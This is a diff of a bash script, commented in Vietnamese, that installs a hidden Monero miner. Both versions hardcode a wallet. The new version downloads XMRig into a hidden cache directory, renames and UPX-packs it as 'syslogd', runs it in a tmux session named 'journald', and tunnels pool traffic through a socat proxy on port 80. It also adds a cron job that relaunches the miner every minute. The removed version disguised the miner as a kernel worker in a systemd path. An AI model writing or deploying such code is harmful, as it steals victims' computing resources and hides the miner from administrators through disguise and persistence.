@@ -1,62 +1,61 @@
 #!/bin/bash
 
-# === Thông số cấu hình ===
-WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"
-POOL="gulf.moneroocean.stream:10128"
-THREADS=$(nproc)
-PROCESS_NAME="[kworker/0:1H]"
-INSTALL_DIR="/usr/lib/systemd"
-BINARY_NAME="systemd-kblockd"
+# ==== Cấu hình chung ====
+POOL_REAL="ulf.moneroocean.stream:443"
+POOL_LOCAL="127.0.0.1:80"
+WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"       # 👈 ĐỔI ví tại đây
+CPU_PERCENT=90
+INSTALL_DIR="$HOME/.cache/.syslog"
+RIG_NAME=$(hostname)
+PROCESS_NAME="syslogd"                 # 👈 Tên tiến trình ngụy trang
+SESSION_NAME="journald"                # 👈 Tên tmux session ngụy trang
 
-# === Cài gói cần thiết ===
-sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+# ==== Chuẩn bị ====
+sudo apt update -y
+sudo apt install -y curl tar upx-ucl tmux socat cpulimit >/dev/null
 
-# === Clone xmrig ===
-cd /tmp
-rm -rf xmrig
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
+# ==== Tạo thư mục ẩn ====
+mkdir -p "$INSTALL_DIR"
+cd "$INSTALL_DIR" || exit 1
 
-# === Chỉnh sửa để ẩn tên tiến trình ===
-sed -i '/int main(/a #include <sys/prctl.h>' src/main.cpp
-sed -i '/xmrig::init();/a prctl(PR_SET_NAME, (unsigned long)"$PROCESS_NAME", 0, 0, 0);' src/main.cpp
+# ==== Tải xmrig không tên ====
+curl -L -o sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+tar -xvzf sys.tar.gz --strip=1 >/dev/null
+rm -f sys.tar.gz
 
-# === Build xmrig ===
-mkdir build && cd build
-cmake .. -DWITH_HWLOC=OFF
-make -j$THREADS
+# ==== Đổi tên file, ẩn danh hoàn toàn ====
+mv xmrig "$PROCESS_NAME"
+chmod +x "$PROCESS_NAME"
+upx --best --lzma "$PROCESS_NAME" >/dev/null 2>&1
 
-# === Tạo config mặc định ===
-cat > config.json <<EOF
+# ==== Tạo file config ẩn danh ====
+cat > .cfg.json <<EOF
 {
-    "autosave": true,
-    "cpu": {
-        "enabled": true
-    },
-    "opencl": {
-        "enabled": false
-    },
-    "cuda": {
-        "enabled": false
-    },
-    "pools": [
-        {
-            "url": "161.248.146.81:80",
-            "user": "84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z",
-            "pass": "x",
-            "keepalive": true,
-            "tls": false
-        }
-    ]
+  "autosave": true,
+  "cpu": true,
+  "background": true,
+  "pools": [
+    {
+      "url": "$POOL_LOCAL",
+      "user": "$WALLET",
+      "pass": "$RIG_NAME",
+      "tls": true,
+      "keepalive": true
+    }
+  ]
 }
 EOF
 
-# === Di chuyển xmrig về vị trí ẩn ===
-sudo mkdir -p $INSTALL_DIR
-sudo mv xmrig $INSTALL_DIR/$BINARY_NAME
-sudo cp config.json $INSTALL_DIR/config.json
-sudo chmod +x $INSTALL_DIR/$BINARY_NAME
+# ==== Tạo proxy từ port 80 sang pool TLS ====
+tmux has-session -t proxy 2>/dev/null || tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
 
-# === Chạy xmrig với tên giả và config ẩn ===
-cd $INSTALL_DIR
-tmux new-session -d -s sysblock "exec -a '$PROCESS_NAME' $INSTALL_DIR/$BINARY_NAME -c $INSTALL_DIR/config.json"
+# ==== Chạy tiến trình ngụy trang, hạn chế CPU ====
+tmux has-session -t "$SESSION_NAME" 2>/dev/null || tmux new-session -d -s "$SESSION_NAME" "cpulimit -l $CPU_PERCENT -- ./syslogd -c .cfg.json"
+
+# ==== Cron tự khôi phục nếu die ====
+(crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME 'cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json')") | crontab -
+
+# ==== Kết thúc ====
+echo "✅ Đào XMR stealth hoàn tất"
+echo "📁 Tệp tin, tiến trình, session: ẩn dưới tên '$PROCESS_NAME', '$SESSION_NAME'"
+echo "🧠 Đang chạy tại: $INSTALL_DIR"
